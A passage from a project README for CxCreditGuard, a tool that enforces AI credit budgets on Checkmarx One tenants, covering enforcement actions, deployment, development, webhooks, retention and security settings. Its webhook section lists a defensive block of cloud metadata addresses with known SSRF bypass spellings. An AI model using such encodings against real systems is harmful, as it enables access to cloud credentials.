admin only and audited (`webhook.secret_created`, `webhook.secret_rotated`,
never the value); the secret is shown once.

In Checkmarx One add a tenant-level webhook with the URL shown on the Settings
card, the secret, and the events Completed Scan, Failed Scan and Partial Scan.
The URL must be reachable from Checkmarx One. Without a webhook the fast check
still finds the same credits within its interval.

## What the enforcement actions actually are

| Level breached | What changes |
| -------------- | ------------ |
| User | The AI roles are unmapped from the user on the `ast-app` client: the list under Settings → Enforcement (*Roles a user restriction removes*, API field `ai_roles`), by default `create-fusion-scan`, `manage-fusion`, `update-llm-scan-mode`, `manage-llm-configuration`. Only roles mapped to the user **directly** can be removed; one held through a group or a composite role is reported, not taken (see below). Nothing else is touched: whether the user can view scans (`view-scans`) stays whatever their Checkmarx permission says |
| Project | What the limit's **What to turn off for projects** choice selects (`project_actions`): **Auto Triage** is disabled via `PUT /api/ai-agents-coordinator/projects/{id}/configuration`; **PR triage and remediation** is disabled by clearing `remediationSeverities` via `PATCH /api/repos-manager/repo/{repo_id}?projectId={id}`; **Fusion** is turned off by writing `scan.config.ai.fusionEnabled` = `"false"` via `PATCH /api/configuration/project?project-id={id}` and, for a project with a repository, `fusionScanConfig.enabled` = `false` via the same repos-manager `PATCH` |
| Group | The chosen project actions, on every project in the group |
| Application | The chosen project actions, on every project in the application |

**Choosing what a limit turns off.** Each project, group and application limit
has a list of project actions (`auto_triage`, `pr_remediation`, `fusion`; API
field and CSV column `project_actions`, `;`-separated in the CSV). New limits
created in the GUI start with all three. A limit whose list is empty in the
database (null: every limit created before the choice existed, and any created
through the API or a CSV without it) keeps the original behaviour, Auto Triage
and PR triage and remediation only, so an upgrade changes nothing. Taking an
action off a limit that restricts now puts that setting back at once (reason
`action_deselected`); other limits restricting the same project keep their
hold. The Simulation page, the blast radius in the limit form and the
enforcement safety ceilings all count the chosen actions.

Before anything changes, the current state is read and stored on the enforcement
row: exactly which roles the user held, the project's prior Auto Triage `enabled`
flag **and its full config**, the prior severity list, and for Fusion the whole
`scan.config.ai.fusionEnabled` entry (value, `originLevel`, `allowOverride`) and the
repository's prior `fusionScanConfig`. Restore replays that snapshot. A feature
that was already off before the utility touched it stays off afterwards, and a
restore never resets branches, severity levels or the Fusion model.

**Restricting a user, in detail.**

* **Which roles.** The default is the four plain (non-composite) `ast-app`
  roles that gate spending AI credits: `create-fusion-scan` (*trigger a Fusion
  scan*: the one that spends credits), `manage-fusion` (Fusion in the account
  and project settings), `update-llm-scan-mode` (Fast/Targeted/Full) and
  `manage-llm-configuration` (LLM opt-in / opt-out). The composites that
  contain them are not on the list: `scan-fusion` also carries the ordinary
  scanning roles (`create-scan`, `create-project`, `view-results`, …) and
  `fusion-manager` also carries `update-tenant-params`, so removing either
  would over-restrict. `ai-triage-assist`, the built-in role of the AI Triage
  system user, is refused on save (`forbidden_ai_roles`) and never removed by
  any restriction, whatever is stored: removing it breaks Auto Triage. Settings →
  Enforcement, *Roles a user restriction removes* (setting
  `enforcement.ai_roles`, API field `ai_roles`), changes the list. Names are
  checked against the roles the tenant actually has on `ast-app`
  (`GET /api/settings/client-roles`, admins only, cached for a minute, never an
  error when IAM cannot be read; while it cannot, only names already in the
  list or the defaults are accepted). An empty list is refused, and so is a
  protected role (its holders are never restricted, so naming it would make a
  restriction do nothing for them; protecting a role the list names is refused
  the same way). A role that looks like an administration role (`*admin*`,
  `manage-*`, `realm-*`, `iam-*`) is saved only with an explicit confirmation
  (API field `confirm_admin_roles: true`; the picker marks such roles and asks
  first); the default roles never count as such, though two match `manage-*`.
* **Upgrading from the Risk Management default.** Until 2026-11 the default
  was `view-risk-management`, `view-risk-management-dashboard` and
  `view-risk-management-tab`, which do not gate spending AI credits. An install
  on the default gets the new one; a list an admin chose is kept as it is. A
  stored list that is exactly the old default, same names in the same order
  (what *Back to the default* saved), is moved to the new default by migration
  `c9f2a6e1d4b7`; downgrading moves exactly the new default back. Restrictions
  in force keep, and give back, the roles they recorded.
* **Who a user budget cannot stop.** Someone who gets Fusion through a
  composite role keeps it: `ast-admin` (on a live tenant held by 274 of 296
  users; no longer protected by default) contains all four default roles directly,
  and `scan-fusion` contains `create-fusion-scan`. *Enforcement coverage* shows
  them as kept through a composite. The fix is on the tenant: give people
  `ast-scanner` or `ast-risk-manager` (neither contains an AI role) plus
  `create-fusion-scan` directly where they should run Fusion. Project, group
  and application budgets do not depend on roles.
* **A change applies to restrictions made from then on.** Every user
  restriction records the list it used (`ai_roles` on its undo snapshot).
  Restore gives back exactly the roles that restriction recorded as removed; the
  drift check looks for those roles only; and the pass that returns roles an
  earlier version should not have taken (`view-scans`, once) goes by the
  recorded list too, the Risk Management three for a restriction made before
  the list was a setting (never today's default). Protected roles work as
  before.
* **More credits give the roles back.** Raising a restricted user's budget
  above their usage (Limits, a bulk edit, a CSV import) or approving a credit
  request that does so lifts the restriction at once (reason
  `credit_increased`; the next cycle finishes it if Checkmarx One could not be
  reached): exactly the roles the restriction recorded as removed are mapped
  back, whatever the setting says now, and it is audited
  (`enforcement.reversed`). A role an admin already mapped back by hand is
  simply mapped again (Keycloak ignores a mapping that exists). Another limit
  still restricting the user keeps them restricted until it is lifted too.
* **Where each role comes from.** Before restricting, CreditGuard reads, best
  effort: the user's direct client role mappings (as before), their effective
  client roles (`GET .../users/{id}/role-mappings/clients/{clientUuid}/composite`),
  their groups (`GET .../users/{id}/groups`) with the parent groups worked out
  from the group paths (`GET /auth/realms/<tenant>/groups`) and each group's
  client role mappings (`GET .../groups/{id}/role-mappings/clients/{clientUuid}`),
  and which composite roles contain an AI role
  (`GET .../clients/{clientUuid}/roles/{roleName}/composites`). These follow
  Keycloak's admin REST API (Checkmarx One's IAM is Keycloak based) and are
  **not verified on a real Checkmarx One tenant**: any refusal (403), 404 or
  other failure only means *source unknown*, is listed on the record
  (`role_sources_unread`), never stops the restriction and is not reported on
  the key permission check (the platform client and its role list, which the
  key is checked for, still are). The reads are bounded: at most 50 of a
  user's groups (the rest are listed as not read), composite roles followed 4
  levels deep (deeper nesting is listed as not read), and only the composite
  children that belong to `ast-app` (matched by client id, never by name).
  Realm-level composite roles (a realm's default roles, for example) are not
  traversed: an AI role held through one shows as *source unknown*.
* **What is removed.** Only the AI roles mapped to the user directly. A role
  still held through a group or a composite role stays effective however the
  direct mapping is changed, so for that role the restriction **is not
  effective**. It is recorded on the action (`kept_effective`, with each
  source), said once in a notification (*<user> keeps <role> through group
  <name> / role <name>; CreditGuard removed only the direct mapping. Remove it
  from the group or role in Checkmarx One, or add the user to an exemption*),
  and audited once (`enforcement.not_effective`). CreditGuard never changes a
  group or a composite role: that would take the role from everyone else who
  holds it that way. It is not re-notified each cycle.
* **Read back.** After the direct mappings are removed, the effective roles are
  read back once (the direct mappings when the effective ones cannot be read;
  nothing is then reported as kept, and the unread read-back is listed).
  A removed role still read as held for no reason that can be seen is in doubt,
  as with Fusion: the first time is a quiet retry on the next cycle; the second
  time it is recorded as kept through a source that cannot be seen. A role still
  mapped directly on two consecutive read-backs means the tenant did not keep
  the removal: said once (*AI role removal not kept*), not sent again this
  period, still restorable.
* **Drift.** A role of the recorded list mapped to the user directly again is
  drift, as before. A role effective only through a group or a composite role is
  not drift: it was reported when the restriction was applied. Nor is usage by
  a person who keeps an AI role that way a *usage kept rising after a
  restriction* violation.
* **Simulation.** The Simulation page and the blast radius in the limit form
  show, for each user who would be restricted, the roles that would be removed
  (with what each grants: its composite children, and for each default role a
  short description, such as *Trigger a Fusion scan: the role that spends AI
  credits*), the roles that would stay effective and where from, and what could
  not be read. Admins only: a viewer sees which roles a restriction removes,
  and no IAM read is made for them. The tenant is read best effort for the
  request: at most 50 users per preview (the page says when it stopped there),
  each read tried once with a 5 s timeout, 10 s in all, and nothing more once
  IAM does not answer (the remaining users say *not read: Checkmarx IAM did not
  answer*). A user already restricted is not read again (*already
  restricted*). A user's reading is reused for a minute (dropped when the
  connection changes). Not read at all in demo mode or without a connection.

**Auto Triage and PR triage and remediation are read back.** Both writes are
read back once, like Fusion's: what was there before always stays on the
record, so Restore stays exact. Still on (Auto Triage) or still listing
severities (PR triage and remediation) straight after the write, the outcome is
in doubt and the next cycle tries again, quietly. Still so after that attempt
too:

* Auto Triage is taken to be **set account-wide** ("select all") with the
  project unable to override it: said once (*<project>: Auto Triage is set
  account-wide*, audit `enforcement.not_restricted`), the action stays
  restorable, the write is not sent again for the rest of the period, and it is
  never a policy violation every cycle. The configuration's `allowOverride`
  (seen as `{"projects": false, "branches": true, ...}` on a project-scope read)
  is recorded verbatim on the action (`auto_triage_allow_override`, and
  `auto_triage_allow_override_read_back`); its meaning is not documented and is
  not interpreted. The Simulation page says that turning Auto Triage off *may
  not hold* for a project whose latest restriction (in its limit's current
  period, else the latest one) found it set account-wide; or, softly (*not
  verified yet*), for one whose latest restriction is not applied, was not read
  back, and was read with `allowOverride.projects` false. That shape is the
  ordinary one, so an applied restriction never warns because of it. A later
  read that shows Auto Triage off on the project (a restriction applied and
  read back off, or one verified to hold) withdraws an earlier account-wide
  conclusion.
* PR triage and remediation is taken not to be kept by the tenant: said once
  (*PR triage and remediation change not kept*), restorable, not sent again
  this period.

A read-back that fails says nothing either way; the drift check reads the
setting again next cycle.

**Turning Fusion off, in detail.** One kind per write, like the other halves:
`disable_fusion` (the project's scan setting) and `disable_repo_fusion` (the
repository's), each restored and verified on its own.

* The write sends the whole entry back with the new value, as the Checkmarx One
  UI does (`[{"key": "scan.config.ai.fusionEnabled", "name": "Fusion Scan", ...,
  "value": "false", "originLevel": "Project", ...}]`), and also sets
  `allowOverride: false` so that a scan started with its own settings cannot
  turn Fusion back on for itself. **That Checkmarx One honours this lock for ad
  hoc scans is not verified.** If Checkmarx rejects the locked entry (400 or
  422) the value is written without the lock, and the record and the
  restriction notification say the lock was not accepted. After the write the
  setting is read back once. One read straight after a write can be behind it
  (a propagation delay, a cache), so nothing is concluded from it alone, and
  what was there before always stays on the record for Restore. A value that
  still reads `"true"` is not counted as turned off: the outcome stays in doubt
  (Restore still puts back what was there), it is retried next cycle, and only
  if that retry reads it on again is the admin told (*Could not restrict*, then
  once a day). A lock that does not read back is kept as sent but marked
  unconfirmed; its absence is re-applied without an alarm, and the next check
  decides: seen holding, it is confirmed and from then on its removal is drift;
  absent again, the tenant is taken not to keep it, which is said once per
  project and period (*Fusion lock not kept*, audit `enforcement.lock_not_kept`)
  and the lock is no longer sent or checked. A tenant that does not keep the
  lock therefore never produces a violation every cycle; the value is still
  enforced. A second limit on the same project inherits the first one's word on
  the lock, doubt included. The lock attempt can
  be switched off (Settings → Enforcement, *Lock Fusion against per-scan
  override*, on by default). CreditGuard does not rely on the lock: see
  [Policy violations](#policy-violations).
* A project whose scan settings have no Fusion entry is left alone, with a
  notification saying why; the project's other restrictions still apply.
* A setting inherited from the tenant (`originLevel` `Tenant` or `Environment`)
  is set on the project when it is turned off. Restore writes the previous
  value and `allowOverride` back, which also sets it on the project: there is no
  known endpoint to remove a project's own value, so a later tenant-level change
  no longer reaches that project. The restore notification says so. Removing
  the project's own value is deliberately **not** attempted with a guessed
  `DELETE`: a wrong one could remove the project's other overrides too. See
  [Remaining unknowns](#remaining-unknowns) (item 6).
* The repository half is **not verified**: that the repos-manager read returns
  `fusionScanConfig`, and that a `PATCH` of `{"fusionScanConfig": {...,
  "enabled": false}}` changes it. When the read does not include it, there is
  nothing to turn off there: the action is recorded as left alone (not
  applicable; never a failure of the cycle, no notification, not counted by the
  safety ceilings), the audit log says so once per project whatever the period
  (`enforcement.not_applicable`), and it is looked at again every cycle. When the
  read fails, it is left unchanged and the admin is told. After the `PATCH` the
  setting is read back once. Still on, the outcome stays in doubt (what was
  there before is kept) and the next cycle tries again, quietly; still on after
  that attempt too, the tenant is taken not to support it: recorded once
  (*repository Fusion setting not supported*), never as a failure of the cycle
  and never later as drift, and the `PATCH` is not sent again for the rest of
  the period. What was there before stays on the record even then, so Restore
  (or the end of the restriction) writes it back, which changes nothing if it
  was never taken.
* Drift: a value read back as `"true"` (or the lock read back removed, or the
  repository's `enabled` read back `true`) is drift and is re-asserted; a
  setting that cannot be read is re-applied quietly and counted as *could not
  verify*, the same rule as for the other actions.
* A restriction whose outcome is in doubt (a write that timed out) and is then
  retried keeps the evidence of what the first attempt took, whatever the
  retry finds: the retry's own result is merged with it, never laid over it.
  The same holds for the lock's state when a second limit restricts the same
  project and the first one lets go.
* When the setting cannot be read during the drift check and it is meant to be
  locked, it is written locked only; it is never rewritten unlocked from the
  value it had before the restriction.
* What it does not stop: a scan started with its own settings where the lock is
  not honoured; the AI engine running without Fusion (LLM-based scanning, whose
  cost is not known); people's own AI Triage and AI Remediation.
* **Downgrading.** Restore Fusion restrictions (or let them lift) before
  downgrading below the version that added them (migration `f4c2a7d1e9b3`): an
  earlier version does not know the `disable_fusion` and `disable_repo_fusion`
  actions, so it can neither verify nor restore them, and its downgrade drops
  `credit_limit.project_actions` and the `policy_violation` table.

## Deploy

Two supported paths, both on Podman. Start with the single container to try it;
use Compose to run it for real.

### Quick start — single container

The whole utility ships in **one** image (UI bundled with the API) over plain
HTTP on port 8000, with **no required configuration**: on first start it
generates its own master key and a first admin account. From the repository root:

```sh
# Linux / macOS / WSL
make podman-run

# Windows: run.bat (cmd.exe) or .\run-podman.ps1 (PowerShell)
```

Each builds `cxcreditguard:podman`, starts the container, and tails the startup
log — which prints the initial `admin` credentials on a fresh volume. Then open
**http://localhost:8000**. The first sign-in asks for a new password, because
the printed one stays readable in the log.

The equivalent without the helper scripts:

```sh
podman build -f deploy/podman/Dockerfile -t cxcreditguard:podman .
podman volume create cxcreditguard-data
podman run -d --name cxcreditguard --restart unless-stopped \
  -p 8000:8000 -v cxcreditguard-data:/app/data cxcreditguard:podman
```

Or run a published release instead of building one (the package is private: log
in with a GitHub token that has `read:packages`, see [Updates](#updates)):

```sh
podman login ghcr.io
podman run -d --name cxcreditguard --restart unless-stopped \
  -p 8000:8000 -v cxcreditguard-data:/app/data ghcr.io/cxsmtp/vcxcreditguard:latest
```

From then on it updates itself (Settings → Updates).

| Action | `make` | `run.bat` | `run-podman.ps1` |
| ------ | ------ | --------- | ---------------- |
| Build and run | `make podman-run` | `run.bat` | `.\run-podman.ps1` |
| Stream logs | `make podman-logs` | `run.bat logs` | `.\run-podman.ps1 -Logs` |
| Stop / remove | `make podman-down` | `run.bat down` | `.\run-podman.ps1 -Down` |
| Erase all data | `make podman-purge` | `run.bat purge` | `.\run-podman.ps1 -Purge` |

Good to know:

- **State lives in the `cxcreditguard-data` volume** (`/app/data`): the SQLite
  database, the master key (`.master_key`) and the generated password
  (`.admin_password`). Back it up if you store real Checkmarx secrets — losing
  the volume loses the key and makes those secrets unrecoverable. A host bind
  mount must be writable by UID 10001.
- **This image runs in development mode over plain HTTP** (Secure cookies are off,
  because a browser discards them over HTTP and login would appear to do nothing).
  **Do not expose it directly to the internet** — use Compose for that.

### Hardened deployment — Podman Compose

For production (HTTPS via an nginx TLS proxy, plus PostgreSQL) run the root
`docker-compose.yml` with Podman Compose (Podman 4.1+):

```sh
cp .env.example .env
# Generate a master key for the .env file:
python -c "import os,base64;print(base64.b64encode(os.urandom(32)).decode())"
```

Set `CXCG_MASTER_KEY` (the value printed above — everything encrypted at rest
depends on it) and `POSTGRES_PASSWORD` (any strong value; Compose won't start
without it). To bootstrap the first admin, also set `CXCG_BOOTSTRAP_ADMIN_USERNAME`
and `CXCG_BOOTSTRAP_ADMIN_PASSWORD` before the first start, then remove them after
logging in. Provide a TLS certificate per [deploy/nginx/README.md](deploy/nginx/README.md),
then:

```sh
podman compose -f docker-compose.yml up -d
podman compose -f docker-compose.yml logs -f app
```

The stack is four containers: the app, PostgreSQL, the nginx proxy (the only one
that publishes a port) and a `backup` container that dumps the database once a
day. Read [Operating it](#operating-it) before relying on it: backups stay on
the same host until you copy them off, and the master key is not in them.

## Local development

```sh
python -m venv .venv
.venv/Scripts/activate            # Windows
# source .venv/bin/activate       # macOS and Linux

pip install -e "backend[dev]"

export CXCG_ENV=development
export CXCG_COOKIE_SECURE=false   # only valid outside production
export CXCG_MASTER_KEY="$(python -c 'import os,base64;print(base64.b64encode(os.urandom(32)).decode())')"

cd backend
uvicorn app.main:app --reload
```

Migrations run automatically at startup. The API is at
`http://127.0.0.1:8000`, interactive docs at `/docs` (development only, never
exposed in production), and health at `/healthz`.

### Tests, lint, dependency audit

```sh
cd backend
python -m pytest -q            # about 1,000 tests
python -m ruff check .
python -m ruff format --check .
python -m pip_audit --strict -r constraints.txt   # dependency vulnerability scan
```

The suite runs on SQLite by default. To run it on PostgreSQL, which is what the
Compose deployment uses and what CI also does, point it at an empty database:

```sh
CXCG_TEST_DATABASE_URL=postgresql+psycopg://user:pass@localhost:5432/cxcg_test \
  python -m pytest -q
```

CI (`.github/workflows/ci.yml`) additionally builds the Compose stack and runs
`deploy/ci/smoke-test.sh` against it: sign in through the proxy, take a backup and
restore it, and check that a second instance refuses to start.

### Updating dependencies

`backend/constraints.txt` pins every Python package the image installs, so two
builds of the same commit install the same Python code (base images and
operating system packages still follow their tags). `pyproject.toml` still states
the supported ranges. To move to newer versions:

```sh
python -m venv /tmp/lock && /tmp/lock/bin/pip install "backend[postgres,dev]"
/tmp/lock/bin/pip freeze | grep -vi '^cxcreditguard' > /tmp/new-pins.txt
# replace the pins in backend/constraints.txt (keep the header comment), then:
/tmp/lock/bin/pip install -e backend
/tmp/lock/bin/python -m pip_audit --strict -r backend/constraints.txt
cd backend && /tmp/lock/bin/python -m pytest -q
```

Every Checkmarx call in the tests is served by `httpx.MockTransport`, and retry
backoff is injected, so the suite makes no network calls and takes seconds.

### Driving a cycle by hand

```sh
curl -sX POST https://host/api/ops/run-cycle?force_org_sync=true \
  -b cookies.txt -H "X-CSRF-Token: $CSRF"
```

Returns per step statistics: users and projects synced, records ingested per
dimension, limits evaluated, warnings raised, restrictions applied, and any step
that failed. `GET /api/ops/status` gives the dashboard tiles (next run, last
success, entities in warning, entities restricted, unresolved subjects).

## The GUI

React, TypeScript and Tailwind, built by Vite into `backend/app/static` and served
by the same origin as the API. No CORS in production, no separate deployment, and
one artefact. (For a dev server on another origin, `CXCG_ALLOWED_ORIGINS` takes
exact origins, `scheme://host[:port]`, comma separated; a wildcard is refused at
start-up.)

| Page | What it does |
| ---- | ------------ |
| **Setup** | Paste an API key, confirm the derived tenant and region before anything is stored, test the connection, override the regional base URL |
| **Dashboard** | Tenant total, trend of credits consumed between polls, split by action type, top consumers per level with limits marked, status tiles |
| **Limits** | Table per entity level with live usage bars, create and edit, monitor/enforce toggle, exemptions, bulk edit, CSV import and export |
| **Notification Center** | Filterable feed, unread badge, active restrictions table, one click "Restore access" with confirmation |
| **Audit log** | Searchable, paginated, with a before/after diff view per entry |
| **Settings** | Scheduler interval or cron, org refresh, ingestion window, retention, SMTP and webhook, consumption attribution (disputes / auto-matched / unmatched), utility accounts |

Screenshots: `docs/screenshots/` (placeholders, to be captured against your own
tenant).

Notes on how it is built, since a few choices are deliberate:

- **Dark and light are both selected palettes**, not one flipped into the other.
  The chart series colours are separate validated steps per surface.
- **Charts are hand written SVG and CSS**, no charting library. That keeps the
  bundle small, keeps every mark under our control, and means no third party
  script has to be allowed by the CSP.
- **One series means no legend, two or more always get one**, and every series is
  also directly labelled, so identity is never carried by colour alone. Each chart
  has a table view for the same reason.
- **No inline scripts anywhere.** The CSP has no `unsafe-inline` for scripts, so
  even the theme bootstrap runs from the bundle. A test asserts this stays true.
- The dashboard plots the **difference between polls** rather than the cumulative
  figure, because the cumulative curve over a sliding window says nothing useful.
  Both numbers appear in the table view; they are never put on one plot with two
  y-scales.

### Frontend development

```sh
cd frontend
npm install
npm run dev        # http://localhost:5173, proxies /api to 127.0.0.1:8000
npm run build      # type checks, then emits into backend/app/static
```

The backend serves the built bundle when `backend/app/static` exists and runs API
only when it does not, so a backend-only checkout still works.

### Trying it without a tenant

```sh
cd backend
python -m scripts.seed_demo --admin-password 'Str0ng!Demo#Pass'
uvicorn app.main:app
```

That writes a representative organisation model, 24 polls of usage history,
limits in several states, notifications and audit entries, then you can sign in as
`demo-admin`. It never calls Checkmarx and never enforces anything. Use it for
screenshots and for finding your way around before pointing the tool at a real
tenant.

## Code layout

```
backend/app/
  core/          config, AES-256-GCM secret box, Argon2 passwords, token hashing,
                 logging with redaction
  db/            engine, session scope, portable column types, migration runner
  models/        accounts, connection, org mirror, usage snapshots, limits,
                 enforcement records, policy violations, notifications, audit log
  checkmarx/     apikey, regions, token, client, usage (consumption parser),
                 iam (users, groups, role mappings), platform (projects,
                 applications, AI toggles, Fusion settings), credits (pool,
                 action rates), scans
  services/      connection, auth, audit, org_sync, ingestion, periods,
                 evaluation, enforcement, role_sources (where a user's
                 roles come from), violations, usage_mix, limits_service,
                 notifications, settings_store, pacing (per-cycle budgets and
                 rotation for large tenants), cycle, enforcement_selftest
                 (Settings → Enforcement → Run self-test) with demo_tenant
                 (the in-process tenant it uses in demo mode)
  updates/       in-app updates: GHCR client, release manifest and signature,
                 installed versions, check / install / rollback / auto-update
  scheduler.py   APScheduler wiring, reconfigurable at runtime
  api/           dependencies (auth, CSRF, RBAC), middleware, routes
  schemas/       request and response models with strict validation
  static/        the built SPA (produced by the frontend build, not in git)
alembic/         migrations
scripts/         seed_demo.py, for a tenant-free demo database; loadtest.py,
                 the load test (see Sizing and scale); release_manifest.py
                 and release_keygen.py, for signed releases
cxcg_launcher.py the single image's main process: runs the selected version,
                 rolls back one that does not come up (standard library only)
tests/           unit, service and API tests, plus the in-memory fake tenant
                 and its 2,000-project synthetic variant (scale_tenant.py)

frontend/src/
  api/           typed fetch client with CSRF handling, response types
  components/    app shell, UI primitives, entity picker, stat tile
  components/charts/  trend line, action breakdown, top consumer bars
  pages/         Login, Setup, Dashboard, Limits, Violations, Notifications, Audit,
                 Settings
  lib/           formatting, theme and toast context
  hooks/         data fetching and polling

deploy/nginx/    TLS terminating reverse proxy
```

The dependency direction is one way, as the [high-level diagram](#high-level-architecture)
shows: `api` and `scheduler` call `services`, `services` call `checkmarx` and
`models`, and nothing below `services` knows the web layer exists. `cycle.py` is
the only orchestrator.

Two design decisions worth knowing before reading the code:

**Sync I/O throughout.** This is a single tenant admin tool whose busiest hour
involves a handful of admins and one scheduler thread. Sync SQLAlchemy and
`httpx.Client` remove a whole class of async footguns (accidental blocking
calls, session sharing across tasks) at no practical cost. The one exception is
bounded: independent read-only Checkmarx calls of a cycle (verification
read-backs, scan listings) are made a few at a time on worker threads that
never touch the database (`pacing.parallel_map`).

**One HTTP client for all Checkmarx traffic.** `app/checkmarx/client.py` owns
base URL selection, token injection, re-authentication on 401, retry with
exponential backoff and full jitter, `Retry-After` handling, redacted logging and
pagination. No service is allowed to call Checkmarx directly, so those
behaviours cannot drift between callers.

## Notification delivery

The Notification Center is always the record of truth. Email and webhook are
copies, so a broken SMTP server can never lose a warning or hide an enforcement
action. Delivery outcome is written back per channel and shown in the feed.

Both channels are configured on the Settings page, which also has a "Send a test"
button that delivers a sample without leaving a row behind in the feed.

- **Minimum severity** filters what gets pushed out. The default is warning and
  above, so a quiet informational notification does not wake anyone up.
- **Retries stop.** After three failed attempts a notification is marked as given
  up on, because a dead endpoint should not make the utility resend the same
  payload every two minutes for a week. Changing the delivery settings resets the
  counters, since that is a real chance for the channel to start working.

### Webhook payload

```json
{
  "id": 412,
  "created_at": "2026-08-11T09:14:02+00:00",
  "severity": "critical",
  "category": "enforcement",
  "title": "User James restricted",
  "body": "The user limit on James was reached in 2026-08 ...",
  "entity": { "type": "user", "id": "8f1a999b-...", "label": "James" },
  "enforcement_action_id": 37,
  "reversible": true,
  "tenant": "your-tenant",
  "source": { "name": "CxCreditGuard", "version": "0.1.0" }
}
```

When a signing secret is configured, each request carries:

```
X-CxCreditGuard-Timestamp: 1786000442
X-CxCreditGuard-Signature: sha256=<hex>
```

The signature is `HMAC-SHA256(secret, "<timestamp>.<raw body>")`. Verify it against
the **raw** body before parsing, and reject a timestamp that is too old. The
timestamp is inside the signed material precisely so a captured request cannot be
replayed later with a fresh header.

One deliberate limitation: the webhook target (and the mail server) is only
refused when it is a cloud metadata or platform address (AWS, GCP, Azure,
Alibaba Cloud), a link-local address, the unspecified address (`0.0.0.0`, `::`)
or, for the webhook, a loopback address (a mail relay on the same host is
allowed). It is not a general egress control: posting to an internal host is a
supported deployment, so private ranges are allowed. Only an Admin can set the
URL. The check covers every spelling of an address (`2852039166`, `0xa9fea9fe`,
`[::ffff:169.254.169.254]`, 6to4, NAT64) and is made again when the request is
sent and the connection opened, against the addresses the name resolves to at
that moment; the connection goes to one of exactly those, so a name that
resolves somewhere harmless when it is saved and to the metadata address later
(DNS rebinding) is refused. Redirects are not followed. Through an HTTP proxy
from the environment (`HTTPS_PROXY`) the name is still resolved and checked
before the request is handed to the proxy; a name this host cannot resolve is
left to the proxy, whose own egress rules then apply.

## Data retention

`retention_days` (default 365) controls how long snapshots, notifications,
scheduler runs and audit entries are kept. Pruning runs at most once a day inside
the normal cycle. Five safeguards are worth knowing:

1. **A seven day floor.** A shorter setting is raised to it and the run says so. A
   governance tool with a week of history cannot answer the question it exists to
   answer.
2. **Applied enforcement actions are never pruned.** Their undo snapshot is the
   only record of how to give access back, so it outlives any retention window.
3. **A notification attached to a live restriction is kept**, however old, because
   it carries the Restore access button.
4. **Auto-triage charges inside the lookback window are kept**, however short the
   retention setting, because they are part of someone's current figure. Older
   ones are pruned with everything else. Policy violations follow the same
   window once resolved; open and acknowledged ones are kept (an admin's
   to-do), and the AI-scan information rows go with the window whatever their
   status.
5. **The prune of audit rows is itself audited.** `app/services/retention.py` is
   the only code anywhere that deletes audit rows, and it writes an entry stating
   the counts, so the log always explains its own gaps.

Consumption readings are most of the database (one row per user, project,
application and group per cycle), so two more things keep them in check, both
summarised in the prune's audit entry (`thinned_snapshots`, `raw_cleared_records`,
`pinned_snapshots`):

* **Raw rows are kept for a week.** Each reading stores every row as Checkmarx
  sent it (`usage_record.raw`) next to the parsed figures. After 7 days the raw
  copy is cleared, except where something still reads it: the latest reading of
  each dimension, the readings an open budget period's usage breakdown starts
  from (the Fusion model of each scan is only in the raw row), the baseline of a
  restriction in force, and rows that matched no user, project or application.
  The response pages of a reading (`usage_snapshot.raw`) are no longer stored at
  all, except for a held reading (the evidence of a collapsed answer, which has
  no rows). Cleared in batches, at most 20,000 readings a run, oldest first; a
  reading passed over while something referred to it is cleared once nothing does.
* **Old readings are thinned** (*Thin old consumption readings*, Settings →
  General, on by default): every reading of the last 3 days is kept, then one an
  hour per dimension up to 40 days, then one a day. The tiers are a choice of
  resolution for the trend and for reading the history; correctness rests on
  the pins: a reading any calculation refers to is never removed, whatever its
  age: the latest of each dimension and lookback window, each restriction's
  baseline (the reading a rise in usage since it was applied is measured from,
  see [Policy violations](#policy-violations)), and the readings open periods'
  usage breakdowns start from. Auto-triage charges and each project's
  auto-triage cursor record a reading's id but never read it back, so they pin
  nothing (the charges themselves are kept, for the consumption window). Whole
  readings only, never single rows; held and demo readings are never thinned.
  Deleted in batches of 100 readings, a transaction each, at most 20,000 a run;
  the retention window's own prune deletes in batches of 1,000 (never one list
  of ids, which PostgreSQL limits to 65,535). Off: every reading is kept for the
  whole retention window, as before.

## Configuration

Every variable is documented in [.env.example](.env.example). The ones that
change behaviour most:

| Variable | Default | Notes |
| -------- | ------- | ----- |
| `CXCG_MASTER_KEY` / `CXCG_MASTER_KEY_FILE` | none | Required. 32 bytes base64. Startup fails without it. |
| `CXCG_DATABASE_URL` | SQLite in `./data` | `postgresql+psycopg://...` for Postgres. |
| `CXCG_ENV` | `production` | `production` refuses insecure cookies and hides the API docs. |
| `CXCG_SESSION_IDLE_TTL_MINUTES` | 60 | Idle timeout. |
| `CXCG_SESSION_ABSOLUTE_TTL_HOURS` | 12 | Hard cap regardless of activity. |
| `CXCG_LOGIN_MAX_ATTEMPTS` | 5 | Failures before lockout, which then backs off exponentially. |
| `CXCG_CX_TOKEN_REFRESH_MARGIN_SECONDS` | 300 | Refresh the access token this long before it expires. |
| `CXCG_TRUSTED_PROXY_HOPS` | 0 | How many reverse proxies sit in front of the app. Compose sets it to 1 for the bundled nginx. Each further proxy or load balancer in front of that adds one, together with the nginx change in [deploy/nginx/README.md](deploy/nginx/README.md). Too low and every sign-in appears to come from the proxy; too high and a client can forge its address. |
| `CXCG_CX_ALLOWED_HOSTS` | none | Extra Checkmarx One hostnames to accept. Tenant URLs must be `https` and end in `checkmarx.net`; a dedicated or private host has to be listed here or the connection is refused. |
| `CXCG_SMTP_CA_FILE` | system CAs | CA bundle used to verify the mail server's certificate, for a server with a private CA. |
| `BACKUP_INTERVAL_HOURS` / `BACKUP_KEEP_DAYS` | 24 / 14 | Compose only: how often the database is dumped and how long dumps are kept. |
| `CXCG_DATA_DIR` | `./data` (`/app/data` in the image) | Where installed versions, the launcher's state and pre-update backups are kept. |
| `CXCG_UPDATE_START_TIMEOUT` | 180 | Seconds a newly installed version has to answer its health check before the launcher rolls it back. |
| `CXCG_UPDATE_PUBLIC_KEY` | the image's key | Release signing public key (PEM), instead of the image's own `/app/app/updates/release-signing-key.pub` (never one from the data volume). Without either, nothing is installed automatically. |

## Security posture

1. **Secrets at rest.** The Checkmarx API key, two factor secrets, the SMTP
   password, and the webhook URL and signing secret are encrypted with
   AES-256-GCM. Recovery codes are stored only as keyed digests. Keys are
   derived per purpose from the master key with HKDF-SHA256, and the purpose is
   bound in as additional authenticated data, so a ciphertext written for one
   column cannot be replayed into another. The master key comes from the
   environment or a mounted file and is never written to the database.
2. **Secrets in logs.** `app/core/logging.py` interpolates each record and then
   redacts it: JWT shaped values, `Authorization` headers, OAuth form fields and
   credential shaped JSON keys go by pattern, and live secret values (the
